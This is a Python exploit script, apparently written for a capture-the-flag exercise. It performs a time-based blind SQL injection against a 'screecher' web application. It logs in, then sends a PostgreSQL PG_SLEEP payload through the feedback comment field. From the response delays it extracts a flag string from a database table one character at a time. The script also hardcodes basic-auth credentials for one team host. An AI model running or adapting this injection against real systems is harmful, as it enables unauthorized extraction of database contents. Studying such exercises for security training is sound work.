import sys
import string
import datetime
import requests


sess_team	= '0'
sess_user	= 'blind_sqli_ex'
sess_pass	= 'blind_sqli_ex'
sess_domain	= 'team%s.screecher.de' % sess_team
sess_url	= 'https://%s' % sess_domain

char_map	= 'abcdef' + ''.join([str(i) for i in range(0, 10)]) + '}'
sleep_time	= 1


def get_auth():
	if (sess_team == '17'):
		return requests.auth.HTTPBasicAuth(
        	'pijost', 'deaddeaddeaddeaddeaddeaddeaddead'
    	)
	return None


def match(session, index, char, delay):

	injection = ("'); SELECT (CASE WHEN "
		"LOWER(SUBSTRING((SELECT content FROM dbtests_feedback "
		"WHERE dbtests_feedback.id=1), %d, 1))='%c' "
		"THEN PG_SLEEP(%d) END); -- ") % (index, char, delay)
	print(injection)
	init_time = datetime.datetime.now()
	feedback_r = session.post('%s/save-feedback' % sess_url, data={
		'user': sess_user, 'comment': injection
	}, auth=get_auth())
	time_delta = (datetime.datetime.now() - init_time)
	return (time_delta.seconds >= delay)


if __name__ == '__main__':

	print('Attempting to login at screecher instance...')

	session = requests.Session()
	login_r = session.post('%s/login' % sess_url, data={
		'user': sess_user, 'pwd': sess_pass
	}, auth=get_auth())
	print(str(login_r.status_code))

	if (login_r.status_code == 200):

		char_index = 5
		char_buffer = 'SWAG{'

		while not char_buffer.endswith('}'):

			char_index += 1
			success = False

			print("Trying to get character at index %d..." % char_index)

			for current_char in char_map:
				if match(session, char_index, current_char, sleep_time):
					success = True
					char_buffer += current_char
					print("Success! Buffer %s" % char_buffer)
					break

			if not success:
				print('Failed to find character at index %d! Aborting...' % char_index)
				sys.exit(-1)


		print('Acquired buffer: %s' % char_buffer)

		print('Attempting logout...')
		log_res = session.get('%s/logout' % sess_url, auth=get_auth())
		print(str(log_res.status_code))
